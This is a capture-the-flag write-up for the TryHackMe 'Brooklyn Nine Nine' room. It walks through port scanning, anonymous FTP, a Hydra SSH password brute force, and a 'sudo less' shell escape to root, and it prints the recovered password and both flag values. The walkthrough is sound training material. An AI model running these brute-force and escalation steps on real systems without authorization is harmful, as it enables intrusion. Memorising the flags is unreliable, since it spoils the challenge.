# Brooklyn Nine Nine

<div align="left" data-full-width="false">

<figure><img src="../.gitbook/assets/95b2fab20e29a6d22d6191a789dcbe1f.jpeg" alt="" width="158"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

### 🔗 [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.218.233`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "10.10.218.233 brooklyn.thm" >> /etc/hosts

mkdir thm/brooklyn.thm
cd thm/brooklyn.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
PING brooklyn.thm (10.10.218.233) 56(84) bytes of data.
64 bytes from brooklyn.thm (10.10.218.233): icmp_seq=1 ttl=63 time=61.1 ms
64 bytes from brooklyn.thm (10.10.218.233): icmp_seq=2 ttl=63 time=61.5 ms
64 bytes from brooklyn.thm (10.10.218.233): icmp_seq=3 ttl=63 time=60.6 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

#### Task 2 - Find the User flag

```bash
nmap --open brooklyn.thm
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 15:36 EDT
Nmap scan report for brooklyn.thm (10.10.218.233)
Host is up (0.068s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -p21,22,80 -sV -sC -n -Pn brooklyn.thm
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-23 16:08 EDT
Nmap scan report for brooklyn.thm (10.10.218.233)
Host is up (0.073s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.80.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We found a good info: ftp-anon: Anonymous FTP login allowed (FTP code 230), but first we check the port 80.

<figure><img src="../.gitbook/assets/Schermata del 2023-06-23 21-48-58.png" alt=""><figcaption><p><a href="http://brooklyn.thm/">http://brooklyn.thm</a>:80</p></figcaption></figure>

inspecting source code we found this message:

```bash
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("brooklyn99.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
```

{% hint style="info" %}
```
 Have you ever heard of steganography?
```
{% endhint %}

After this, we try to access with ftp

```bash
ftp brooklyn.thm
Connected to brooklyn.thm.
220 (vsFTPd 3.0.3)
Name (brooklyn.thm:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

We can use anonymous login (without psw)

```bash
ftp> ls
229 Entering Extended Passive Mode (|||21186|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||16727|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*************************************************************************************|   119       14.56 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (1.67 KiB/s)
```

In the current directory there's a file: note\_to\_jake.txt, we get it to read it.

```bash
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

it's another great indication, we know that there's a user: Jake with a weak password.

We use brute force tool: Hydra with parameters: Jake and dictionary (rockyou).

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt brooklyn.thm ssh
```

```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-24 05:56:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://brooklyn.thm:22/
[22][ssh] host: brooklyn.thm   login: jake   password: 987654321
```

{% hint style="info" %}
jake::987654321
{% endhint %}

We can use the credentials obtained for ssh access:

```bash
ssh jake@brooklyn.thm
jake@brooklyn.thm's password: 
Last login: Tue May 26 08:56:58 2020
```

```bash
jake@brookly_nine_nine:~$ pwd
/home/jake
jake@brookly_nine_nine:~$ whoami
jake
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ cd ..
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

ee11cbb19052e40b07aac0ca060c23ee

</details>

#### Task 3 - Find the Root flag

Now, we need to get root permissions to explore the root folder.

We can use the following command to list SUID files or sudo -l command:

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```bash
find: ‘/run/systemd/unit-root’: Permission denied
find: ‘/run/systemd/inaccessible’: Permission denied
find: ‘/run/lock/lvm’: Permission denied
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 170760 Dec  1  2017 /bin/less
-rwsr-xr-x 1 root root 26696 Jan  8  2020 /bin/umount
```

/bin/less stands out, We can use script of this website to became a root, in this case we choose less process: [https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)

```bash
sudo less /etc/profile
!/bin/sh
```

```bash
jake@brookly_nine_nine:/$ sudo less /etc/profile
# whoami
root
```

Now, we're root!

```bash
# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

63a9f0ea7bb98050796b649e85481845

</details>
